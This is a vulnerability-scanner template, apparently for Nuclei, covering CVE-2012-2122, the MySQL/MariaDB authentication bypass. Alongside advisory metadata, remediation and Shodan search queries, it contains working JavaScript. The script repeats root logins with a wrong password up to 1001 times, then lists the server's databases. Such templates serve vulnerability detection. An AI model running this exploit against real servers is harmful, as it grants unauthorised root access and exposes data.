id: CVE-2012-2122
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:a:oracle:mysql:5.1.51:*:*:*:*:*:*:*
    cve-id: CVE-2012-2122
    cvss-metrics: CVSS:2.0/AV:N/AC:H/Au:N/C:P/I:P/A:P
    cvss-score: 5.1
    cwe-id: CWE-287
    epss-percentile: 0.99894
    epss-score: 0.94058
  description: 'sql/password.c in Oracle MySQL 5.1.x before 5.1.63, 5.5.x before 5.5.24,
    and 5.6.x before 5.6.6, and MariaDB 5.1.x before 5.1.62, 5.2.x before 5.2.12,
    5.3.x before 5.3.6, and 5.5.x before 5.5.23, when running in certain environments
    with certain implementations of the memcmp function, allows remote attackers to
    bypass authentication by repeatedly authenticating with the same incorrect password,
    which eventually causes a token comparison to succeed due to an improperly-checked
    return value.

    '
  impact: 'Attackers can bypass authentication by repeatedly attempting to authenticate
    with incorrect passwords, eventually succeeding due to improper memcmp return
    value checking in certain environments.

    '
  metadata:
    max-request: 1
    product: mysql
    shodan-query:
    - product:"MySQL"
    - product:"mysql"
    vendor: oracle
    verified: true
  name: MySQL - Authentication Bypass
  reference:
  - https://github.com/vulhub/vulhub/tree/master/mysql/CVE-2012-2122
  - http://kb.askmonty.org/en/mariadb-5162-release-notes/
  - http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00007.html
  - http://security.gentoo.org/glsa/glsa-201308-06.xml
  - http://securitytracker.com/id?1027143
  remediation: 'Upgrade to MySQL 5.1.63, 5.5.24, 5.6.6 or later, or MariaDB 5.1.62,
    5.2.12, 5.3.6, 5.5.23 or later that properly handles memcmp return values.

    '
  severity: medium
  tags: cve,cve2012,js,enum,network,mysql,fuzz,oracle,vuln
javascript:
- args:
    Host: '{{Host}}'
    Pass: wrong
    Port: 3306
    Query: show databases;
    User: root
  code: "const mysql = require('nuclei/mysql');\nconst client = new mysql.MySQLClient;\n\
    for (let i = 1; i <= 1001; i++) {\ntry {\nconst connected = client.ExecuteQuery(Host,\
    \ Port, User, Pass, Query);\nExport(connected);\nbreak;\n} catch {\n  // error\n\
    }\n}\n"
  extractors:
  - json:
    - .Rows[] | .Database
    part: response
    type: json
  matchers:
  - dsl:
    - success == true
    type: dsl
  pre-condition: 'isPortOpen(Host,Port);

    '
